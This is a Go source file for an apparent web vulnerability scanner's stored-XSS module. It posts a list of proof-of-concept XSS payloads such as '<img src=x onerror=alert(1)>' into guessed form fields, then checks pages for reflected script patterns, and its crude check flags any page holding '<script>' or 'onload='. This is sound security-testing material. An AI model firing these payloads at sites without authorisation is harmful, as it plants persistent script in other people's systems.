package engine

import (
	"bytes"
	"context"
	"fmt"
	"log/slog"
	"mime/multipart"
	"net/http"
	"strings"
	"sync"
	"time"
)

type XSSStoredScannerModule struct {
	scanner *VulnScanner
}

func NewXSSStoredScannerModule(scanner *VulnScanner) *XSSStoredScannerModule {
	if scanner == nil {
		scanner = NewVulnScanner(map[string]interface{}{"module_name": "xss-stored-scanner"})
	}
	return &XSSStoredScannerModule{scanner: scanner}
}

func (m *XSSStoredScannerModule) ID() string       { return "xss-stored-scanner" }
func (m *XSSStoredScannerModule) Name() string     { return "XSS Stored Scanner" }
func (m *XSSStoredScannerModule) Category() string { return "web" }

func (m *XSSStoredScannerModule) Run(ctx context.Context, targets []*Target, config map[string]interface{}) (*ModuleResult, error) {
	start := time.Now()
	result := &ModuleResult{ModuleID: m.ID()}
	var mu sync.Mutex
	var wg sync.WaitGroup

	sem := make(chan struct{}, 3)

	for _, target := range targets {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(start)
			return result, ctx.Err()
		default:
		}

		if target.URL == "" && target.Host != "" {
			target.URL = fmt.Sprintf("http://%s", target.Host)
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(t *Target) {
			defer wg.Done()
			defer func() { <-sem }()

			findings := m.scanTarget(ctx, t)
			if len(findings) > 0 {
				mu.Lock()
				result.Findings = append(result.Findings, findings...)
				mu.Unlock()
			}
		}(target)
	}

	wg.Wait()
	result.Duration = time.Since(start)
	slog.Info("[XSSStored-Scanner] 扫描完成",
		"targets", len(targets),
		"findings", len(result.Findings),
		"duration", result.Duration,
	)

	return result, nil
}

func (m *XSSStoredScannerModule) scanTarget(ctx context.Context, target *Target) []*Finding {
	var findings []*Finding

	forms := m.discoverForms(ctx, target)

	for _, form := range forms {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		xssPayloads := []string{
			`<script>alert(document.domain)</script>`,
			`<img src=x onerror=alert(1)>`,
			`<svg/onload=alert(1)>`,
			`<body onload=alert(1)>`,
			`"><script>alert(1)</script>`,
			`' onmouseover='alert(1)`,
		}

		for _, payload := range xssPayloads {
			err := m.submitForm(ctx, form, payload)
			if err != nil {
				continue
			}

			body, _, err := m.scanner.Client.Fetch(m.newGetRequest(ctx, form.Action))
			if err != nil {
				continue
			}

			if strings.Contains(body, payload) || m.containsXSSPattern(body) {
				findings = append(findings, &Finding{
					Target:      target,
					Type:        "xss_stored",
					Title:       "Stored Cross-Site Scripting (XSS)",
					Description: fmt.Sprintf("The form at %s is vulnerable to stored XSS via field '%s'", form.Action, form.Fields[0]),
					Severity:    "high",
					Confidence:  80,
					Evidence:    fmt.Sprintf("POST %s with payload stored and reflected", form.Action),
					Timestamp:   time.Now(),
					Remediation: "Sanitize and encode user input before storing and displaying",
					Data: map[string]string{
						"action": form.Action,
						"field":  form.Fields[0],
					},
				})

				break
			}
		}
	}

	return findings
}

type formInfo struct {
	Action string
	Method string
	Fields []string
}

func (m *XSSStoredScannerModule) discoverForms(ctx context.Context, target *Target) []formInfo {
	var forms []formInfo

	body, _, err := m.scanner.Client.Fetch(m.newGetRequest(ctx, target.URL))
	if err != nil {
		return forms
	}

	if strings.Contains(body, "<form") {
		forms = append(forms, formInfo{
			Action: target.URL,
			Method: "POST",
			Fields: []string{"comment", "message", "content", "name", "username", "email", "title", "description"},
		})
	}

	return forms
}

func (m *XSSStoredScannerModule) submitForm(ctx context.Context, form formInfo, payload string) error {
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	for _, field := range form.Fields {
		writer.WriteField(field, payload)
	}
	writer.Close()

	req, _ := http.NewRequestWithContext(ctx, http.MethodPost, form.Action, &buf)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	_, _, err := m.scanner.Client.Fetch(req)
	return err
}

func (m *XSSStoredScannerModule) containsXSSPattern(body string) bool {
	patterns := []string{
		"<script>",
		"onerror=",
		"onload=",
		"onmouseover=",
		"alert(",
		"javascript:",
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range patterns {
		if strings.Contains(bodyLower, pattern) {
			return true
		}
	}

	return false
}

func (m *XSSStoredScannerModule) newGetRequest(ctx context.Context, url string) *http.Request {
	req, _ := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	return req
}
